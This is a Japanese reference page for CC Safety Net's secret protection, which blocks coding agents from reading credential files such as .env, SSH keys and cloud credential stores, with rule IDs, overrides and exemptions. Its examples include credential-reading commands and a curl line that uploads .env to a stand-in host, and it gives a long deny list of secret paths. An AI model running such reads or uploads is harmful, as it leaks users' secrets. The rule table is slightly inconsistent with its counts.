## Claude Code は既定で .env や ~/.aws/credentials の読み取りをブロックしますか？

いいえ。2026 年 10 月時点で、Claude Code のサンドボックスのドキュメントには組み込みの資格情報の拒否リストはないと書かれており、既定の読み取りアクセスでは `~/.aws/credentials` や `~/.ssh/` などのファイルも読めます。他の CLI には、ツールごとに自分で書くオプトインの拒否設定があります。CC Safety Net は、インストールした時点から `.env` ファイル、SSH 秘密鍵、クラウドの資格情報ストア、コーディングエージェントの認証トークンの読み取りをブロックします。対象は `cat .env` のようなシェルコマンドと、エージェント自身の読み取り、編集、書き込み、検索のツールです。独自の拒否パスも追加できます。

シークレット保護は、資格情報を含む可能性があるファイルの読み書きをブロックします。コマンド解析の前に動作し、すべての安全レベルに適用されます。ブロックすると、一致したルール ID が[ブロックメッセージ](/ja/guides/how-it-works#what-a-block-looks-like)と[監査ログ](/ja/reference/audit-log)に記録されます。

登録済みのルールは 138 個あります。大部分は同じ ID パターンを共有する生成ファミリーに属するため、以下の表ではすべての ID ではなく、ファミリーとその ID の形式を示します。13 個のルールからなる [Coding CLI 設定階層](#coding-cli-config-tier-off-by-default)を除き、すべてのルールが既定で有効です。

## 動作する場所

シークレット保護は、シェルコマンドと、エージェントの読み取り、書き込み、編集、検索、パッチのツールを検査します。書き込みだけでなく読み取りもブロックするため、`cat .env`、`strings id_rsa`、`dd if=.env` はいずれもブロックされます。シェルコマンドでは次のように扱います。

- 相対パスは、コマンドがそこまでに移動したディレクトリを基準に解決します。そのため `cd ~ && cat .ssh/config` は `secret.home.ssh` でブロックされます。
- `curl` のアップロードは読み取りとして扱います。そのため `curl -d @.env https://example.com` は `secret.basename.env` でブロックされます。
- `python`、`node` などのインタープリターに渡すインラインコードからもパスを探すため、`python -c "open('.env')"` はブロックされます。
- `pwsh -c '…'` のスクリプトは PowerShell として読み取るため、`pwsh -c 'Get-Content ~/.ssh/config'` は `secret.home.ssh` でブロックされます。
- テキストを受け取るフラグの値はパスとして扱いません。`gh issue list --search credentials` や `git commit -m credentials` は実行できます。
- URL のクエリの値はファイル名として扱いません。`curl 'localhost:3000/todos?order=id.asc'` は実行できます。

## ブロックされたファイルを許可する

保護対象のファイルを許可する方法は 2 つあります。ルール単位のオーバーライドは、1 つのルールをどこでも無効にします。許可パスは、指定したファイルやディレクトリを、コーディング CLI のルール以外のすべての組み込みルールから除外します。例として、パケットキャプチャーを `captures/` に置いているプロジェクトを考えます。`cat captures/session.pcap` は `secret.ext.pcap` でブロックされます。

| やりたいこと | 使うもの | 効果 |
| --- | --- | --- |
| すべての `.pcap` ファイルを読む | `secret_protection.overrides` に `"secret.ext.pcap": "off"` | `.pcap` のルールがすべてのディレクトリで無効になる。それ以外のルールは引き続き適用される |
| 1 つのディレクトリにあるキャプチャーだけを読む | `secret_protection.allow_paths` に `"captures"` | `captures/` 配下のファイルが除外される。それ以外の場所にある `.pcap` ファイルはブロックされたまま |

<Steps>
  <Step title="ルール ID を確認する">
    ルール ID はブロックメッセージに表示されます。`npx -y cc-safety-net explain --json 'cat captures/session.pcap'` を実行して `ruleId` を読み取ることもできます。
  </Step>
  <Step title="policy.json を自分で編集する">
    エージェントは `policy.json` を変更できないため、エディターかダッシュボードで編集します。[ポリシーファイルを編集する](/ja/configuration/policy#edit-the-policy-file)を参照してください。ルールを無効にする場合は次のようにします。

    ```json
    {
      "version": 1,
      "secret_protection": {
        "overrides": {
          "secret.ext.pcap": "off"
        }
      }
    }
    ```

    1 つのディレクトリを除外する場合は次のようにします。

    ```json
    {
      "version": 1,
      "secret_protection": {
        "allow_paths": ["captures"]
      }
    }
    ```

    相対パスの許可パスは、[ポリシー](/ja/configuration/policy)で説明しているとおり、設定の作業ディレクトリを基準に解決されます。`"captures/session.pcap"` のように、特定のファイル 1 つを指定することもできます。
  </Step>
  <Step title="変更を確認する">
    同じコマンドに対してもう一度 `explain` を実行します。許可と表示されれば完了です。
  </Step>
</Steps>

許可パスで、設定済みの[拒否パス](#deny-paths)や `secret.cli.*` のルールが除外されることはありません。プロジェクトファイルで許可パスを追加したりルールを無効にしたりすると、CC Safety Net はそれを保護の弱化として報告します。オーバーライドの書き方は[ポリシー](/ja/configuration/policy#secret-protection)を、指定できるエントリは[シークレットの許可パス](/ja/configuration/policy#secret-allow-paths)を参照してください。

## standard モードが読み取りと見なさないもの

[standard モード](/ja/configuration/modes#default-mode)では、次の形は組み込みの機密パスの読み取りと見なしません。[strict と paranoid](/ja/configuration/modes#strict-mode-cc_safety_net_strict=1) では、これらもすべて読み取りとして扱います。どの形でも、設定済みの拒否パスは緩和されません。

| 形 | 例 |
| --- | --- |
| `ls`、`stat`、`test -e`、`test -f`、`[ -e ]`、`[ -f ]`、`git check-ignore` によるメタデータのみの参照 | `ls -la ~/.ssh`、`test -f ~/.ssh/id_rsa` |
| 読み取り、書き込み、コマンド実行のアクションを伴わない `find` | `find ~/.ssh -type f` |
| 数えるだけの `wc` | `wc -l .env` |
| 出力をファイル名、件数、終了ステータスに限った `grep` または `rg`（`-l`、`-c`、`-q`、`grep -L`） | `grep -l KEY .env` |
| まだファイルが存在しない場所での `mkdir`、`touch`、リダイレクトによるファイル作成 | `mkdir -p fx/credentials && touch fx/.env` |
| `tailscale cert` が書き込むファイルと、`openssl x509 -in` の入力 | `openssl x509 -in crt.pem -noout -enddate` |
| ループが読み取りコマンドに渡さない `for` のリストの語 | `for t in .env.local; do grep -c -- "$t" notes.md; done` |
| Python や JavaScript のコード内で、データにすぎない文字列リテラル | `python -c "x = '.env'"` |

こうした参照は、`git check-ignore .env && git status --short` のように複合コマンドの 1 つのセグメントであってもかまいません。ただし、別のセグメントに読み取りがあればブロックされるため、`test -f .env && cat .env` は拒否されます。`wc`、`grep`、`rg` でも、出力が後ろのパイプやキャプチャーに届きうる場合は読み取りとして扱うため、`grep -l KEY .env | xargs cat` は拒否されます。コードがファイル操作の呼び出しに渡すリテラルもブロックされるため、`python -c "open('.env')"` は拒否されます。

ファイルの作成、`tailscale` と `openssl` の形、データのリテラルで緩和されるのは、組み込みのファイル名ルールだけです。[ホームディレクトリ](#home-directory-rules)や[Coding CLI](#coding-cli-credential-tier-on-by-default) のパスはブロックされたままです。

## 一致順序

- 設定済みの[拒否パス](#deny-paths)を最初に検査し、常にそれが優先されます。
- [ホームディレクトリルール](#home-directory-rules)は env テンプレートと公開鍵の除外より優先されるため、`~/.ssh/.env.example` と `~/.ssh/id_rsa.pub` はブロックされたままです。
- コーディング CLI のルール（`secret.cli.*`）には[許可パス](#allow-paths)が効きません。

## ベース名ルール

9 個のルールが、どのディレクトリでも、ベース名が完全に一致するファイルをブロックします。

| ルール ID | ベース名 |
| --- | --- |
| `secret.basename.env` | `.env` |
| `secret.basename.npmrc` | `.npmrc` |
| `secret.basename.pypirc` | `.pypirc` |
| `secret.basename.netrc` | `.netrc` |
| `secret.basename.git-credentials` | `.git-credentials` |
| `secret.basename.id-rsa` | `id_rsa` |
| `secret.basename.id-ed25519` | `id_ed25519` |
| `secret.basename.id-ecdsa` | `id_ecdsa` |
| `secret.basename.credentials` | `credentials` |

これらのルールには 2 つの境界があります。

- `secret.basename.credentials` が一致するのは `credentials` という名前だけです。`credentials.json` は、このルールにもほかの組み込みルールにも一致しません。
- `id_dsa` のベース名ルールはありません。ただし、名前がちょうど `id_dsa` のファイルは、後述する広範なパターン `secret.pattern.ssh-key-basename` によってブロックされます。

`.env` ファミリーを広げるパターンルールが 1 つあります。`secret.pattern.env-variant` は、`.env.local`、`.env.production`、`.env.template.local` など、`.env.` で始まるすべてのベース名をブロックします。ただし、[除外されるテンプレート](#exemptions)は対象外です。

<span id="home-directory-rules"></span>

## ホームディレクトリルール

これらのルールは、ホームディレクトリ配下の場所を保護します。対象はそのディレクトリ自体と、その中のすべてです。

| ルール ID | 保護するもの |
| --- | --- |
| `secret.home.ssh` | `~/.ssh` |
| `secret.home.aws` | `~/.aws` |
| `secret.home.gcp` | `~/.gcp` |
| `secret.home.gcloud-config` | `~/.config/gcloud` |
| `secret.home.kube-config` | `~/.kube/config` |
| `secret.home.docker-config` | `~/.docker/config.json` |
| `secret.home.gh-hosts` | `~/.config/gh/hosts.yml` |

単一ファイルを対象とする 2 つのルール（`kube-config`、`docker-config`）には、名前を変えたバックアップを対象とする関連ルールがそれぞれ 8 個あります。ID の形式は `secret.home.<slug>.<suffix>` で、末尾は `bak`、`backup`、`copy`、`disabled`、`old`、`orig`、`save`、`tmp` のいずれかです。そのため、`~/.kube/config.bak` は `secret.home.kube-config.bak` で、`~/.docker/config.json.old` は `secret.home.docker-config.old` でブロックされます。生成されるルールは 16 個で、ファミリー全体では 23 個です。

## 鍵ファイルの派生形ルール

鍵ファイルや資格情報ファイルを名前を変えてコピーしたものには、専用のルールファミリーがあります。`id_rsa`、`id_dsa`、`id_ed25519`、`id_ecdsa`、`credentials` の 5 つの保護対象の接頭辞から作られます。各 ID の `<slug>` は、接頭辞のアンダースコアをダッシュにしたものです（`id-rsa`、`credentials` など）。

- **区切り文字の派生形。** 5 個の `secret.variant.<slug>.separator` ルールは、接頭辞の後ろに `-` または `_` と任意の文字が続く名前をブロックします。`id_rsa-old`、`id_rsa_backup`、`credentials_prod` などです。
- **ドット付きの拡張子の派生形。** 50 個の `secret.variant.<slug>.<suffix>` ルールは、接頭辞の後ろに `.bak`、`.backup`、`.copy`、`.disabled`、`.key`、`.old`、`.orig`、`.pem`、`.save`、`.tmp` の 10 種類のいずれかが続く名前をブロックします。たとえば `id_rsa.bak` は `secret.variant.id-rsa.bak` で、`credentials.pem` は `secret.variant.credentials.pem` でブロックされます。

このファミリーは厳密に一致させるため、似た名前は通ります。`id_rsafoo` には区切り文字がなく、`credentials.json` の拡張子は一覧にありません。

このファミリーには広範なパターンも 1 つあります。`secret.pattern.ssh-key-basename` は、`deploy_key_rsa` や `github_ed25519` のように、`_rsa`、`_dsa`、`_ed25519`、`_ecdsa` で終わる拡張子のないベース名をすべてブロックします。ドットを含む名前は一致しません。

## 拡張子ルール

`secret.ext.<extension>` という形式の ID を持つ 21 個のルールが、次の拡張子を持つファイルをすべてブロックします。

`.agilekeychain`, `.asc`, `.bek`, `.cscfg`, `.fve`, `.gnucash`, `.jks`, `.keychain`, `.kwallet`, `.mdf`, `.ovpn`, `.p12`, `.pcap`, `.pem`, `.pfx`, `.pkcs12`, `.psafe3`, `.rdp`, `.sdf`, `.tblk`, `.tpm`

3 個の拡張子パターンルールが、拡張子のファミリーを対象にします。

| ルール ID | 拡張子 |
| --- | --- |
| `secret.ext-pattern.key` | `.key`, `.keypair` |
| `secret.ext-pattern.keystore` | `.keystore`, `.keyring` |
| `secret.ext-pattern.kdbx` | `.kdb`, `.kdbx` |

オーバーライドにはファミリーの ID を使います。`secret.ext.keypair` ではなく `secret.ext-pattern.key` です。登録されていない ID は、`unknown secret protection rule id "<id>"` で拒否されます。

## Coding CLI 設定階層（既定で無効）

13 個のルールが、同じエージェントの設定ファイルと MCP 設定ファイルを対象にします。これらのファイルには資格情報が直接書かれることがある一方で、エージェントが日常の作業として編集するファイルでもあります。そのため、この階層は無効の状態で提供され、各ルールを有効にするには [`secret_protection.overrides`](/ja/configuration/policy#rules-that-are-off-by-default) で明示的に `"on"` を指定する必要があります。ルールを有効にすると、`<project>` のパスはどのリポジトリルートでも一致します。

| ルール ID | 有効時に保護するもの |
| --- | --- |
| `secret.cli.claude-code.config` | `~/.claude/settings.json`, `~/.claude/settings.local.json`, `~/.claude.json`, `<project>/.claude/settings.local.json`, `<project>/.mcp.json` |
| `secret.cli.codex.config` | `~/.codex/config.toml`, `~/.codex/<name>.config.toml` |
| `secret.cli.gemini.config` | `~/.gemini/settings.json`, `~/.gemini/google_accounts.json`, `<project>/.gemini/settings.json`, `/Library/Application Support/GeminiCli/settings.json`, `/etc/gemini-cli/settings.json` |
| `secret.cli.copilot-cli.config` | `~/.copilot/mcp-config.json` |
| `secret.cli.kimi-code.config` | `~/.kimi-code/config.toml`, `~/.kimi-code/mcp.json`, `~/.kimi/config.toml`, `~/.kimi/config.json`, `~/.kimi/config.json.bak`, `~/.kimi/mcp.json`, `<project>/.kimi-code/mcp.json` |
| `secret.cli.opencode.config` | `~/.config/opencode/opencode.json`, `~/.config/opencode/opencode.jsonc`, `~/.config/opencode/config.json`, `/Library/Application Support/opencode/opencode.json`, `/etc/opencode/opencode.json`, `<project>/opencode.json`, `<project>/opencode.jsonc` |
| `secret.cli.pi.config` | `~/.pi/agent/models.json` |
| `secret.cli.amp.config` | `~/.config/amp/settings.json`, `~/.config/amp/settings.jsonc`, `<project>/.amp/settings.json`, `<project>/.amp/settings.jsonc` |
| `secret.cli.cursor.config` | `~/.cursor/mcp.json`, `<project>/.cursor/mcp.json` |
| `secret.cli.grok-build.config` | `~/.grok/config.toml`, `~/.grok/managed_config.toml`, `~/.grok/requirements.toml`, `<project>/.grok/config.toml`, `/etc/grok/managed_config.toml`, `/etc/grok/requirements.toml` |
| `secret.cli.droid.config` | `~/.factory/settings.json`, `~/.factory/hooks.json`, `~/.factory/mcp.json`, `<project>/.factory/mcp.json` |

| `secret.cli.antigravity` | `~/.gemini/config/hooks.json`, `~/.gemini/config/mcp_config.json` |

`config.json` はよくある名前なので、これに一致するルールはそれぞれ 1 つのディレクトリに限定しています。`secret.cli.opencode.config` が一致するのは `~/.config/opencode` の中だけ、`secret.cli.devin.config` が一致するのは `~/.config/devin` の中だけです。このページに挙げていないディレクトリの `config.json` は許可されたままです。

<span id="deny-paths"></span>

## 拒否パス

[`secret_protection.deny_paths`](/ja/configuration/policy#deny-paths) を使うと、独自の保護対象のファイルやディレクトリを追加できます。一致すると `secret.deny-path` でブロックされます。オーバーライドでも除外でも緩和されません。無効になるのは、`secret_protection.enabled: false` でシークレット保護全体を無効にした場合だけです。

<span id="allow-paths"></span>

## 許可パス

[`secret_protection.allow_paths`](/ja/configuration/policy#secret-allow-paths) は、ファイル、ディレクトリツリー、または `~/code/**/.env.local` のようにフォルダー配下の 1 つのファイル名を、組み込みルールから除外します。拒否パスは引き続き優先され、`secret.cli.*` のルールが除外されることはありません。[ブロックされたファイルを許可する](#allow-a-blocked-file)を参照してください。

<span id="exemptions"></span>

## 除外

上記のルールには 3 つの除外があります。どれも、設定済みの拒否パスを緩和しません。

- **env テンプレート。** ベース名がちょうど `.env.example`、`.env.sample`、`.env.template`、`.env.tpl`、`.env.defaults` のファイルと、`.env.example.` または `.env.sample.` で始まる名前のファイルは、組み込みルールから除外されます。ただし、先に検査されるホームディレクトリルールは除きます。`cat .env.tpl` は許可され、`cat ~/.ssh/.env.tpl` は `secret.home.ssh` でブロックされます。接頭辞の形がそれ以上広がることはないため、`.env.template.local` はほかの `.env.*` の名前と同じく `secret.pattern.env-variant` でブロックされます。
- **公開鍵。** `id_rsa.pub`、`id_ed25519.pub`、`id_ecdsa.pub` はシークレットではないため除外されます。ただし、先に検査される保護対象のホームディレクトリの外にある場合に限ります。`./id_rsa.pub` は許可され、`~/.ssh/id_rsa.pub` は `secret.home.ssh` でブロックされます。
- **ベンダー管理ディレクトリ。** パスのセグメントに `node_modules` や `__pycache__` がある場合、または `vendor/bundle` や `vendor/cache` という隣り合った組がある場合は、ちょうど 2 つのファミリーが無効になります。拡張子ルールと、広範な `secret.pattern.ssh-key-basename` ルールです。それ以外のルールはすべて引き続き適用されるため、`node_modules/x/.env` や `node_modules/x/id_rsa` は通常どおりブロックされます。`.git` はこの除外の対象に含まれません。

## 設定

設定はすべて [`policy.json`](/ja/configuration/policy#secret-protection) で行います。

- `secret_protection.enabled: false` は、組み込みルールと拒否パスを含め、このステージ全体を無効にします。
- `secret_protection.overrides` は、登録済みの ID ごとにルールの状態を設定します。`"off"` は既定で有効なルールを無効にし、`"on"` は設定階層のルールを有効にします。
- `secret_protection.deny_paths` は、独自の保護対象の場所を追加します。
- `secret_protection.allow_paths` は、拒否パスを検査した後で、特定のファイル、ディレクトリツリー、またはフォルダー配下の 1 つのファイル名を、CLI 以外の組み込みルールから除外します。

破壊的コマンド側の[許可パス](/ja/reference/blocked-commands#recursive-deletes-under-allow_paths)では、シークレット保護は緩和されません。同じ設定は[ダッシュボード](/ja/guides/dashboard#secret-protection)の UI からも編集できます。

<Note>
  シークレット保護は範囲を限定したパターンの集合であり、読み取り全般の境界ではありません。どのルールも認識しないファイルにある資格情報は保護されません。この境界については [CC Safety Net が対処できない範囲](/ja/guides/known-limitations#out-of-scope-protections)を、階層ごとの注意点については[既知の制限](/ja/guides/known-limitations)を参照してください。シークレットのマスクは別の仕組みで、ログとブロックメッセージから資格情報の値を取り除きます。[監査ログリファレンス](/ja/reference/audit-log#secret-redaction)と[セキュリティモデル](/ja/guides/security-model#what-redaction-hides-and-what-it-keeps)を参照してください。
</Note>
